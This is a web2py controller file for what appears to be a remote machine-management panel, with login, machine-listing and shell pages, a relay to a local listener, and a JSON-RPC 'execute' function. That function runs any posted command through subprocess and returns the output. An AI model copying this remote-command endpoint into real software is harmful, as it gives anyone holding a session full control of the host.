# -*- coding: utf-8 -*-
### required - do no delete
import urllib

class AjaxSender():
    
    def sendCommand(self,url,message,group='boxes'):
        params = urllib.urlencode({'message': message, 'group':group})
        try:
            f = urllib.urlopen(url, params)
        except IOError:
            raise IOError('Connection To Listener Terminated. Exiting.')
        f.read()
        f.close()
        pass


def user(): return dict(form=auth())
def download(): return response.download(request,db)
def call(): return service()
### end requires
def index():
    return dict(form=auth())

def clientdz():
    text = request.post_vars['text']
    return dict(test=text)

def error():
    return dict()


def testing():
    form=LOAD('default','ajax_form',ajax=True)
    script=SCRIPT('''
        jQuery(document).ready(function(){
          var callback=function(e){alert(e.data)};
          if(!web2py_comet('ws://127.0.0.1:8888/realtime/mygroup',callback))
            alert("html5 websocket not supported by your browser, try Google Chrome");
        });
    ''')
    return dict(form=form, script=script)

def ajaxproxy():
    url = 'http://127.0.0.1:9002/'
    message = request.post_vars['message']
    group = request.post_vars['group']
    sender = AjaxSender();
    sender.sendCommand(url, message, group)
    return dict()

@auth.requires_login()
def shell():
    
    return dict()

@auth.requires_login()
def machines():
    machines = db().select(db.machines.ALL, orderby=db.machines.uuid)
    return dict(machines=machines)



@auth.requires_login()
@service.jsonrpc
def execute(cmd, args=None):
    if args == None:
        command = cmd
    else:
        command = [cmd,args]
    import subprocess
    proc = subprocess.Popen(command, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    stdout = proc.stdout.read() + proc.stderr.read()
    return stdout


